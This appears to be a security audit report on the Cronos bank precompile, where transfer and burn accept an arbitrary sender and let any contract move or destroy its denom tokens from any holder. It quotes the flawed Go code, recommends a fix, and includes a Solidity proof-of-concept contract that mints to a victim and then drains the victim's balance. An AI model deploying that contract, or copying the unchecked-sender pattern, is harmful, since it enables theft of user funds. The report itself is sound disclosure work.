### Title
Arbitrary `sender` in Bank Precompile `transfer`/`burn` Enables Unauthorized Token Drain from Any Holder — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` and `burn` methods of the bank precompile accept a caller-supplied `sender`/`addr` argument and use it directly as the `from` address in `bankKeeper.SendCoins` / `bankKeeper.SendCoinsFromAccountToModule`, with no check that the calling contract is authorized to act on behalf of that address. Any deployed EVM contract can drain or destroy `evm/<contract_address>` native tokens from any holder without the holder's consent.

---

### Finding Description

In `BankContract.Run`, the `TransferMethodName` case unpacks `sender` from the raw ABI input and passes it straight to `bankKeeper.SendCoins`:

```go
// bank.go – TransferMethodName case
sender    := args[0].(common.Address)   // ← arbitrary, from ABI input
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())    // "evm/<caller_hex>"
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is no assertion that `sender == contract.Caller()` and no allowance/approval mechanism. The denom is `evm/<contract.Caller().Hex()>`, so the tokens being moved are the calling contract's own native-bank denom.

The `BurnMethodName` case has the same flaw — the first argument (misleadingly named `recipient` in the variable) is the address whose tokens are burned:

```go
// bank.go – BurnMethodName case
recipient := args[0].(common.Address)   // ← arbitrary, burned FROM this address
addr := sdk.AccAddress(recipient.Bytes())
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt))
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
``` [2](#0-1) 

---

### Impact Explanation

**Critical — Unauthorized transfer/burn of precompile-controlled assets.**

Any EVM contract can:
1. Mint `evm/<contract_address>` tokens to users (e.g., as deposit receipts in a DeFi protocol).
2. Later call `bankPrecompile.transfer(victim, attacker, amount)` to silently move those tokens to the attacker, or call `bankPrecompile.burn(victim, amount)` to destroy them.

No approval from the victim is required; holding the tokens is sufficient. The `evm/<denom>` tokens are native Cosmos bank-module assets, so the theft/destruction is final and irreversible.

---

### Likelihood Explanation

Deploying an EVM contract on Cronos is permissionless. An attacker deploys a contract that presents itself as a legitimate yield/receipt token, accumulates user balances via `mint`, then calls `transfer` or `burn` with arbitrary victim addresses. The attack requires no privileged access, no leaked keys, and no governance action.

---

### Recommendation

In the `TransferMethodName` case, enforce that the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the calling contract")
}
```

For `BurnMethodName`, similarly enforce that the address to burn from is `contract.Caller()`, or introduce an explicit allowance mapping so token holders can grant burn rights. This mirrors the fix recommended in the external report: always derive the `from` address from the authenticated caller rather than accepting it as a parameter. [3](#0-2) 

---

### Proof of Concept

```solidity
// Attacker contract deployed on Cronos EVM
interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract AttackerToken {
    IBankPrecompile constant BANK = IBankPrecompile(address(0x64));

    // Step 1: lure victim into receiving tokens (e.g., as "staking rewards")
    function rewardUser(address victim, uint256 amount) external {
        BANK.mint(victim, amount);
    }

    // Step 2: drain victim's balance — no approval needed
    function steal(address victim, address attacker, uint256 amount) external {
        // sender = victim, but caller is this contract — no auth check in precompile
        BANK.transfer(victim, attacker, amount);
    }
}
```

After `rewardUser(alice, 1000)` and `steal(alice, bob, 1000)`, Alice's `evm/<AttackerToken_address>` balance is zero and Bob holds 1000 tokens — with no transaction signed by Alice. [4](#0-3)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L103-200)
```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
	case BalanceOfMethodName:
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		token := args[0].(common.Address)
		addr := args[1].(common.Address)
		// query from storage
		balance := bc.bankKeeper.GetBalance(stateDB.Context(), sdk.AccAddress(addr.Bytes()), EVMDenom(token)).Amount.BigInt()
		return method.Outputs.Pack(balance)
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
